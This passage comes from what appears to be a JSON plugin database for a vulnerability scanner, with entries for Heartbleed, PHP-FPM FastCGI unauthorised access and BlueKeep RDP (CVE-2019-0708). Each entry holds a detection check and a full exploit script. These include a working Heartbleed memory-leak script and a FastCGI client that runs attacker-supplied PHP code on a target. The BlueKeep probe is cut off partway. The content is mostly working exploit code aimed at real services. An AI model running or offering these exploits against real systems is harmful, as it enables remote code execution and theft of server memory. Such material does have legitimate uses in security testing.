0x0E:\n                break\n        print('[+][{0}]发送攻击数据包'.format(host))\n        sock.send(hb)\n        if hit_hb(sock):\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(hb)\n            pocdict['proof'] = \"type:{0} found, ver: {1}\".format(typ, ver)\n            pocdict['response'] = str(sock.recv(1024))\n\n        sock.close()\n\n    except Exception as e:\n        pocdict['Exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)\n# The author disclaims copyright to this source code.\n\nimport sys\nimport struct\nimport socket\nimport time\nimport select\nimport re\nimport codecs\nfrom optparse import OptionParser\n\ndecode_hex = codecs.getdecoder('hex_codec')\n\noptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\noptions.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')\noptions.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')\noptions.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')\n\ndef h2bin(x):\n        return decode_hex(x.replace(' ', '').replace('\\n', ''))[0]\n\nhello = h2bin('''\n        16 03 02 00  dc 01 00 00 d8 03 02 53\n        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\n        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\n        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\n        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\n        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\n        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n        00 0f 00 01 01\n        ''')\n\nhb = h2bin('''\n        18 03 02 00 03\n        01 40 00\n        ''')\n\ndef hexdump(s):\n    for b in range(0, len(s), 16):\n        lin = [c for c in s[b : b + 16]]\n        hxdat = ' '.join('%02X' % c for c in lin)\n        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)\n        print( '  %04x: %-48s %s' % (b, hxdat, pdat))\n    print()\n\ndef recvall(s, length, timeout=5):\n    endtime = time.time() + timeout\n    rdata = b''\n    remain = length\n    while remain > 0:\n        rtime = endtime - time.time()\n        if rtime < 0:\n            return None\n        r, w, e = select.select([s], [], [], 5)\n        if s in r:\n            data = s.recv(remain)\n            # EOF?\n            if not data:\n                                return None\n            rdata += data\n            remain -= len(data)\n    return rdata\n\n\ndef recvmsg(s):\n    hdr = recvall(s, 5)\n    if hdr is None:\n        print( 'Unexpected EOF receiving record header - server closed connection')\n        return None, None, None\n    typ, ver, ln = struct.unpack('>BHH', hdr)\n    pay = recvall(s, ln, 10)\n    if pay is None:\n        print( 'Unexpected EOF receiving record payload - server closed connection')\n        return None, None, None\n    print( ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))\n    return typ, ver, pay\n\ndef hit_hb(s):\n    s.send(hb)\n    while True:\n        typ, ver, pay = recvmsg(s)\n        if typ is None:\n            print( 'No heartbeat response received, server likely not vulnerable')\n            return False\n\n        if typ == 24:\n            print( 'Received heartbeat response:')\n            hexdump(pay)\n            if len(pay) > 3:\n                print( 'WARNING: server returned more data than it should - server is vulnerable!')\n            else:\n                print( 'Server processed malformed heartbeat, but did not return any extra data.')\n            return True\n\n        if typ == 21:\n            print( 'Received alert:')\n            hexdump(pay)\n            print( 'Server returned error, likely not vulnerable')\n            return False\n\ndef main():\n    opts, args = options.parse_args()\n    if len(args) < 1:\n        options.print_help()\n        return\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    print( 'Connecting...')\n    sys.stdout.flush()\n    s.connect((args[0], opts.port))\n\n    if opts.starttls:\n        re = s.recv(4096)\n        if opts.debug: print( re)\n        s.send(b'ehlo starttlstest\\n')\n        re = s.recv(1024)\n        if opts.debug: print( re)\n        if not b'STARTTLS' in re:\n            if opts.debug: print( re)\n            print( 'STARTTLS not supported...')\n            sys.exit(0)\n        s.send(b'starttls\\n')\n        re = s.recv(1024)\n\n    print( 'Sending Client Hello...')\n    sys.stdout.flush()\n    s.send(hello)\n    print( 'Waiting for Server Hello...')\n    sys.stdout.flush()\n    while True:\n        typ, ver, pay = recvmsg(s)\n        if typ == None:\n            print( 'Server closed connection without sending Server Hello.')\n            return\n        # Look for server hello done message.\n        if typ == 22 and pay[0] == 0x0E:\n            break\n\n    print( 'Sending heartbeat request...')\n    sys.stdout.flush()\n    s.send(hb)\n    hit_hb(s)\n\nif __name__ == '__main__':\n        main()",
            "sysname": "openssl",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "phpframe_fpm_fastcgi_unauth",
            "description": "PHP-FPM Fastcgi 未授权访问漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 9000\n    pocdict = {\n        \"vulnname\":\"phpframe_fpm_fastcgi_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        from io import BytesIO\n        PY2 = True if sys.version_info.major == 2 else False\n        def bchr(i):\n            if PY2:\n                return force_bytes(chr(i))\n            else:\n                return bytes([i])\n\n        def bord(c):\n            if isinstance(c, int):\n                return c\n            else:\n                return ord(c)\n\n        def force_bytes(s):\n            if isinstance(s, bytes):\n                return s\n            else:\n                return s.encode('utf-8', 'strict')\n\n        def force_text(s):\n            if issubclass(type(s), str):\n                return s\n            if isinstance(s, bytes):\n                s = str(s, 'utf-8', 'strict')\n            else:\n                s = str(s)\n            return s\n        class FastCGIClient:\n            \"\"\"A Fast-CGI Client for Python\"\"\"\n\n            # private\n            __FCGI_VERSION = 1\n\n            __FCGI_ROLE_RESPONDER = 1\n            __FCGI_ROLE_AUTHORIZER = 2\n            __FCGI_ROLE_FILTER = 3\n\n            __FCGI_TYPE_BEGIN = 1\n            __FCGI_TYPE_ABORT = 2\n            __FCGI_TYPE_END = 3\n            __FCGI_TYPE_PARAMS = 4\n            __FCGI_TYPE_STDIN = 5\n            __FCGI_TYPE_STDOUT = 6\n            __FCGI_TYPE_STDERR = 7\n            __FCGI_TYPE_DATA = 8\n            __FCGI_TYPE_GETVALUES = 9\n            __FCGI_TYPE_GETVALUES_RESULT = 10\n            __FCGI_TYPE_UNKOWNTYPE = 11\n\n            __FCGI_HEADER_SIZE = 8\n\n            # request state\n            FCGI_STATE_SEND = 1\n            FCGI_STATE_ERROR = 2\n            FCGI_STATE_SUCCESS = 3\n\n            def __init__(self, host, port, timeout, keepalive):\n                self.host = host\n                self.port = port\n                self.timeout = timeout\n                if keepalive:\n                    self.keepalive = 1\n                else:\n                    self.keepalive = 0\n                self.sock = None\n                self.requests = dict()\n\n            def __connect(self):\n                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.sock.settimeout(self.timeout)\n                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                # if self.keepalive:\n                #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n                # else:\n                #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n                try:\n                    self.sock.connect((self.host, int(self.port)))\n                except socket.error as msg:\n                    self.sock.close()\n                    self.sock = None\n                    print(repr(msg))\n                    return False\n                return True\n\n            def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n                length = len(content)\n                buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n                      + bchr(fcgi_type) \\\n                      + bchr((requestid >> 8) & 0xFF) \\\n                      + bchr(requestid & 0xFF) \\\n                      + bchr((length >> 8) & 0xFF) \\\n                      + bchr(length & 0xFF) \\\n                      + bchr(0) \\\n                      + bchr(0) \\\n                      + content\n                return buf\n\n            def __encodeNameValueParams(self, name, value):\n                nLen = len(name)\n                vLen = len(value)\n                record = b''\n                if nLen < 128:\n                    record += bchr(nLen)\n                else:\n                    record += bchr((nLen >> 24) | 0x80) \\\n                              + bchr((nLen >> 16) & 0xFF) \\\n                              + bchr((nLen >> 8) & 0xFF) \\\n                              + bchr(nLen & 0xFF)\n                if vLen < 128:\n                    record += bchr(vLen)\n                else:\n                    record += bchr((vLen >> 24) | 0x80) \\\n                              + bchr((vLen >> 16) & 0xFF) \\\n                              + bchr((vLen >> 8) & 0xFF) \\\n                              + bchr(vLen & 0xFF)\n                return record + name + value\n\n            def __decodeFastCGIHeader(self, stream):\n                header = dict()\n                header['version'] = bord(stream[0])\n                header['type'] = bord(stream[1])\n                header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n                header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n                header['paddingLength'] = bord(stream[6])\n                header['reserved'] = bord(stream[7])\n                return header\n\n            def __decodeFastCGIRecord(self, buffer):\n                header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n                if not header:\n                    return False\n                else:\n                    record = self.__decodeFastCGIHeader(header)\n                    record['content'] = b''\n\n                    if 'contentLength' in record.keys():\n                        contentLength = int(record['contentLength'])\n                        record['content'] += buffer.read(contentLength)\n                    if 'paddingLength' in record.keys():\n                        skiped = buffer.read(int(record['paddingLength']))\n                    return record\n\n            def request(self, nameValuePairs={}, post=''):\n                if not self.__connect():\n                    print('connect failure! please check your fasctcgi-server !!')\n                    return\n\n                requestId = random.randint(1, (1 << 16) - 1)\n                self.requests[requestId] = dict()\n                request = b\"\"\n                beginFCGIRecordContent = bchr(0) \\\n                                         + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                         + bchr(self.keepalive) \\\n                                         + bchr(0) * 5\n                request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                                      beginFCGIRecordContent, requestId)\n                paramsRecord = b''\n                if nameValuePairs:\n                    for (name, value) in nameValuePairs.items():\n                        name = force_bytes(name)\n                        value = force_bytes(value)\n                        paramsRecord += self.__encodeNameValueParams(name, value)\n\n                if paramsRecord:\n                    request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n                request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n                if post:\n                    request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n                request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n                self.sock.send(request)\n                self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n                self.requests[requestId]['response'] = b''\n                return self.__waitForResponse(requestId)\n\n            def __waitForResponse(self, requestId):\n                data = b''\n                while True:\n                    buf = self.sock.recv(512)\n                    if not len(buf):\n                        break\n                    data += buf\n\n                data = BytesIO(data)\n                while True:\n                    response = self.__decodeFastCGIRecord(data)\n                    if not response:\n                        break\n                    if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                            or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                        if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                            self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                        if requestId == int(response['requestId']):\n                            self.requests[requestId]['response'] += response['content']\n                    if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                        self.requests[requestId]\n                return self.requests[requestId]['response']\n\n            def __repr__(self):\n                return \"[+]fastcgi connect:{0} port:{1}\".format(self.host, self.port)\n        client = FastCGIClient(host, port, 6, 0)\n        documentRoot = \"/\"\n        uri = '/usr/local/lib/php/PEAR.php'\n        content = \"<?php var_dump(md5(2333));?>\"\n        params = {\n            'GATEWAY_INTERFACE': 'FastCGI/1.0',\n            'REQUEST_METHOD': 'POST',\n            'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n            'SCRIPT_NAME': uri,\n            'QUERY_STRING': '',\n            'REQUEST_URI': uri,\n            'DOCUMENT_ROOT': documentRoot,\n            'SERVER_SOFTWARE': 'php/fcgiclient',\n            'REMOTE_ADDR': '127.0.0.1',\n            'REMOTE_PORT': '9985',\n            'SERVER_ADDR': '127.0.0.1',\n            'SERVER_PORT': '80',\n            'SERVER_NAME': \"localhost\",\n            'SERVER_PROTOCOL': 'HTTP/1.1',\n            'CONTENT_TYPE': 'application/text',\n            'CONTENT_LENGTH': \"%d\" % len(content),\n            'PHP_VALUE': 'auto_prepend_file = php://input',\n            'PHP_ADMIN_VALUE': 'allow_url_include = On'\n        }\n        response = force_text(client.request(params, content))\n        if r\"56540676a129760a\" in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = content\n            pocdict['proof'] = '56540676a129760a'\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "#!/usr/bin/env python\n# coding=utf-8\nimport socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\n\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n\nPY2 = True if sys.version_info.major == 2 else False\n\n\ndef bchr(i):\n    if PY2:\n        return force_bytes(chr(i))\n    else:\n        return bytes([i])\n\ndef bord(c):\n    if isinstance(c, int):\n        return c\n    else:\n        return ord(c)\n\ndef force_bytes(s):\n    if isinstance(s, bytes):\n        return s\n    else:\n        return s.encode('utf-8', 'strict')\n\ndef force_text(s):\n    if issubclass(type(s), str):\n        return s\n    if isinstance(s, bytes):\n        s = str(s, 'utf-8', 'strict')\n    else:\n        s = str(s)\n    return s\n\n\nclass FastCGIClient:\n    \"\"\"A Fast-CGI Client for Python\"\"\"\n\n    # private\n    __FCGI_VERSION = 1\n\n    __FCGI_ROLE_RESPONDER = 1\n    __FCGI_ROLE_AUTHORIZER = 2\n    __FCGI_ROLE_FILTER = 3\n\n    __FCGI_TYPE_BEGIN = 1\n    __FCGI_TYPE_ABORT = 2\n    __FCGI_TYPE_END = 3\n    __FCGI_TYPE_PARAMS = 4\n    __FCGI_TYPE_STDIN = 5\n    __FCGI_TYPE_STDOUT = 6\n    __FCGI_TYPE_STDERR = 7\n    __FCGI_TYPE_DATA = 8\n    __FCGI_TYPE_GETVALUES = 9\n    __FCGI_TYPE_GETVALUES_RESULT = 10\n    __FCGI_TYPE_UNKOWNTYPE = 11\n\n    __FCGI_HEADER_SIZE = 8\n\n    # request state\n    FCGI_STATE_SEND = 1\n    FCGI_STATE_ERROR = 2\n    FCGI_STATE_SUCCESS = 3\n\n    def __init__(self, host, port, timeout, keepalive):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        if keepalive:\n            self.keepalive = 1\n        else:\n            self.keepalive = 0\n        self.sock = None\n        self.requests = dict()\n\n    def __connect(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.settimeout(self.timeout)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        # if self.keepalive:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n        # else:\n        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n        try:\n            self.sock.connect((self.host, int(self.port)))\n        except socket.error as msg:\n            self.sock.close()\n            self.sock = None\n            print(repr(msg))\n            return False\n        return True\n\n    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n        length = len(content)\n        buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n               + bchr(fcgi_type) \\\n               + bchr((requestid >> 8) & 0xFF) \\\n               + bchr(requestid & 0xFF) \\\n               + bchr((length >> 8) & 0xFF) \\\n               + bchr(length & 0xFF) \\\n               + bchr(0) \\\n               + bchr(0) \\\n               + content\n        return buf\n\n    def __encodeNameValueParams(self, name, value):\n        nLen = len(name)\n        vLen = len(value)\n        record = b''\n        if nLen < 128:\n            record += bchr(nLen)\n        else:\n            record += bchr((nLen >> 24) | 0x80) \\\n                      + bchr((nLen >> 16) & 0xFF) \\\n                      + bchr((nLen >> 8) & 0xFF) \\\n                      + bchr(nLen & 0xFF)\n        if vLen < 128:\n            record += bchr(vLen)\n        else:\n            record += bchr((vLen >> 24) | 0x80) \\\n                      + bchr((vLen >> 16) & 0xFF) \\\n                      + bchr((vLen >> 8) & 0xFF) \\\n                      + bchr(vLen & 0xFF)\n        return record + name + value\n\n    def __decodeFastCGIHeader(self, stream):\n        header = dict()\n        header['version'] = bord(stream[0])\n        header['type'] = bord(stream[1])\n        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n        header['paddingLength'] = bord(stream[6])\n        header['reserved'] = bord(stream[7])\n        return header\n\n    def __decodeFastCGIRecord(self, buffer):\n        header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n\n        if not header:\n            return False\n        else:\n            record = self.__decodeFastCGIHeader(header)\n            record['content'] = b''\n\n            if 'contentLength' in record.keys():\n                contentLength = int(record['contentLength'])\n                record['content'] += buffer.read(contentLength)\n            if 'paddingLength' in record.keys():\n                skiped = buffer.read(int(record['paddingLength']))\n            return record\n\n    def request(self, nameValuePairs={}, post=''):\n        if not self.__connect():\n            print('connect failure! please check your fasctcgi-server !!')\n            return\n\n        requestId = random.randint(1, (1 << 16) - 1)\n        self.requests[requestId] = dict()\n        request = b\"\"\n        beginFCGIRecordContent = bchr(0) \\\n                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                 + bchr(self.keepalive) \\\n                                 + bchr(0) * 5\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                              beginFCGIRecordContent, requestId)\n        paramsRecord = b''\n        if nameValuePairs:\n            for (name, value) in nameValuePairs.items():\n                name = force_bytes(name)\n                value = force_bytes(value)\n                paramsRecord += self.__encodeNameValueParams(name, value)\n\n        if paramsRecord:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n\n        if post:\n            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n\n        self.sock.send(request)\n        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n        self.requests[requestId]['response'] = b''\n        return self.__waitForResponse(requestId)\n\n    def __waitForResponse(self, requestId):\n        data = b''\n        while True:\n            buf = self.sock.recv(512)\n            if not len(buf):\n                break\n            data += buf\n\n        data = BytesIO(data)\n        while True:\n            response = self.__decodeFastCGIRecord(data)\n            if not response:\n                break\n            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                if requestId == int(response['requestId']):\n                    self.requests[requestId]['response'] += response['content']\n            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                self.requests[requestId]\n        return self.requests[requestId]['response']\n\n    def __repr__(self):\n        return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n    parser.add_argument('host', help='Target host, such as 127.0.0.1')\n    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n\n    args = parser.parse_args()\n\n    client = FastCGIClient(args.host, args.port, 3, 0)\n    params = dict()\n    documentRoot = \"/\"\n    uri = args.file\n    content = args.code\n    params = {\n        'GATEWAY_INTERFACE': 'FastCGI/1.0',\n        'REQUEST_METHOD': 'POST',\n        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n        'SCRIPT_NAME': uri,\n        'QUERY_STRING': '',\n        'REQUEST_URI': uri,\n        'DOCUMENT_ROOT': documentRoot,\n        'SERVER_SOFTWARE': 'php/fcgiclient',\n        'REMOTE_ADDR': '127.0.0.1',\n        'REMOTE_PORT': '9985',\n        'SERVER_ADDR': '127.0.0.1',\n        'SERVER_PORT': '80',\n        'SERVER_NAME': \"localhost\",\n        'SERVER_PROTOCOL': 'HTTP/1.1',\n        'CONTENT_TYPE': 'application/text',\n        'CONTENT_LENGTH': \"%d\" % len(content),\n        'PHP_VALUE': 'auto_prepend_file = php://input',\n        'PHP_ADMIN_VALUE': 'allow_url_include = On'\n    }\n    response = client.request(params, content)\n    print(force_text(response))",
            "sysname": "phpframe",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "rdp_bluekeep_rce",
            "description": "RDP BlueKeep 远程命令执行漏洞(CVE-2019-0708)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 3389\n    pocdict = {\n        \"vulnname\":\"rdp_bluekeep_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        class RC4:\n            \"\"\"\n            This class implements the RC4 streaming cipher.\n            Derived from http://cypherpunks.venona.com/archive/1994/09/msg00304.html\n            \"\"\"\n\n            def __init__(self, key, streaming=True):\n                assert (isinstance(key, (bytes, bytearray)))\n\n                # key scheduling\n                S = list(range(0x100))\n                j = 0\n                for i in range(0x100):\n                    j = (S[i] + key[i % len(key)] + j) & 0xff\n                    S[i], S[j] = S[j], S[i]\n                self.S = S\n\n                # in streaming mode, we retain the keystream state between crypt()\n                # invocations\n                if streaming:\n                    self.keystream = self._keystream_generator()\n                else:\n                    self.keystream = None\n\n            def crypt(self, data):\n                \"\"\"\n                Encrypts/decrypts data (It's the same thing!)\n                \"\"\"\n                assert (isinstance(data, (bytes, bytearray)))\n                keystream = self.keystream or self._keystream_generator()\n                return bytes([a ^ b for a, b in zip(data, keystream)])\n\n            def _keystream_generator(self):\n                \"\"\"\n                Generator that returns the bytes of keystream\n                \"\"\"\n                S = self.S.copy()\n                x = y = 0\n                while True:\n                    x = (x + 1) & 0xff\n                    y = (S[x] + y) & 0xff\n                    S[x], S[y] = S[y], S[x]\n                    i = (S[x] + S[y]) & 0xff\n                    yield S[i]\n\n        def _log(message):\n            # pass\n            print(message)\n\n        def _bin_to_hex(data):\n            return ''.join('%.2x' % i for i in data)\n\n        def _create_socket():\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            s.settimeout(10)\n            s.connect((host, port))\n            return s\n\n        def _conn_req():\n            return (\n                b\"\\x03\\x00\"  # TPTK, Version: 3, Reserved: 0\n                b\"\\x00\\x2b\"  # Length\n                b\"\\x26\"  # X.224 Length\n                b\"\\xe0\"  # X.224 PDU Type\n                b\"\\x00\\x00\"  # Destination reference\n                b\"\\x00\\x00\"  # Source reference\n                b\"\\x00\"  # Class\n                b\"\\x43\\x6f\\x6f\\x6b\\x69\\x65\\x3a\\x20\\x6d\\x73\\x74\\x73\\x68\\x61\\x73\\x68\\x3d\\x75\\x73\\x65\\x72\\x30\\x0d\\x0a\"  # Token\n                b\"\\x01\"  # RDP Type\n                b\"\\x00\"  # Flags\n                b\"\\x08\"  # Length\n                b\"\\x00\\x00\\x00\\x00\\x00\"  # requestedProtocols, TLS security supported: False, CredSSP supported: False\n            )\n\n        def _connect_initial():\n            return (\n                b\"\\x03\\x00\\x01\\xca\\x02\\xf0\\x80\\x7f\\x65\\x82\\x01\\xbe\\x04\\x01\"\n                b\"\\x01\\x04\\x01\\x01\\x01\\x01\\xff\\x30\\x20\\x02\\x02\\x00\\x22\\x02\\x02\\x00\"\n                b\"\\x02\\x02\\x02\\x00\\x00\\x02\\x02\\x00\\x01\\x02\\x02\\x00\\x00\\x02\\x02\\x00\"\n                b\"\\x01\\x02\\x02\\xff\\xff\\x02\\x02\\x00\\x02\\x30\\x20\\x02\\x02\\x00\\x01\\x02\"\n                b\"\\x02\\x00\\x01\\x02\\x02\\x00\\x01\\x02\\x02\\x00\\x01\\x02\\x02\\x00\\x00\\x02\"\n                b\"\\x02\\x00\\x01\\x02\\x02\\x04\\x20\\x02\\x02\\x00\\x02\\x30\\x20\\x02\\x02\\xff\"\n                b\"\\xff\\x02\\x02\\xfc\\x17\\x02\\x02\\xff\\xff\\x02\\x02\\x00\\x01\\x02\\x02\\x00\"\n                b\"\\x00\\x02\\x02\\x00\\x01\\x02\\x02\\xff\\xff\\x02\\x02\\x00\\x02\\x04\\x82\\x01\"\n                b\"\\x4b\\x00\\x05\\x00\\x14\\x7c\\x00\\x01\\x81\\x42\\x00\\x08\\x00\\x10\\x00\\x01\"\n                b\"\\xc0\\x00\\x44\\x75\\x63\\x61\\x81\\x34\\x01\\xc0\\xd8\\x00\\x04\\x00\\x08\\x00\"\n                b\"\\x20\\x03\\x58\\x02\\x01\\xca\\x03\\xaa\\x09\\x04\\x00\\x00\\x28\\x0a\\x00\\x00\"\n                b\"\\x78\\x00\\x31\\x00\\x38\\x00\\x31\\x00\\x30\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xca\\x01\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x18\\x00\\x07\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n                b\"\\x04\\xc0\\x0c\\x00\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\xc0\\x0c\\x00\"\n                b\"\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xc0\\x44\\x00\\x05\\x00\\x00\\x00\"\n                b\"\\x63\\x6c\\x69\\x70\\x72\\x64\\x72\\x00\\xc0\\xa0\\x00\\x00\\x4d\\x53\\x5f\\x54\"\n                b\"\\x31\\x32\\x30\\x00\\x80\\x80\\x00\\x00\\x72\\x64\\x70\\x73\\x6e\\x64\\x00\\x00\"\n                b\"\\xc0\\x00\\x00\\x00\\x73\\x6e\\x64\\x64\\x62\\x67\\x00\\x00\\xc0\\x00\\x00\\x00\"\n                b\"\\x72\\x64\\x70\\x64\\x72\\x00\\x00\\x00\\x80\\x80\\x00\\x00\"\n            )\n\n        def _erect_domain_req():\n            return (\n                b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x04\\x00\\x01\\x00\\x01\"\n            )\n\n        def _attach_user_req():\n            return (\n                b\"\\x03\"  # TPKT Version: 3\n                b\"\\x00\"  # Reserved: 0\n                b\"\\x00\\x08\"  # Length: 8\n                b\"\\x02\\xf0\\x80\\x28\"\n            )\n\n        def _channel_join_req(initiator, channelId):\n            return (\n                       b\"\\x03\\x00\\x00\\x0c\\x02\\xf0\\x80\\x38%s%s\"\n                   ) % (initiator, channelId)\n\n        def _security_exchange(rcran, rsexp, rsmod, bitlen):\n            x = (rcran ** rsexp) % rsmod\n            nbytes, rem = divmod(x.bit_length(), 8)\n            if rem:\n                nbytes += 1\n            encrytedClientRandom = x.to_bytes(nbytes, byteorder='little')\n            _log(\"Encrypted client random: %s\" % _bin_to_hex(encrytedClientRandom))\n            bitlen += 8\n            userdata_length = 8 + bitlen\n            userdata_length_low = userdata_length & 0xFF\n            userdata_length_high = userdata_length // 256\n            flags = 0x80 | userdata_length_high\n            return (\n                    b\"\\x03\\x00%s\" % (userdata_length + 15).to_bytes(2, byteorder='big') +  # TPTK\n                    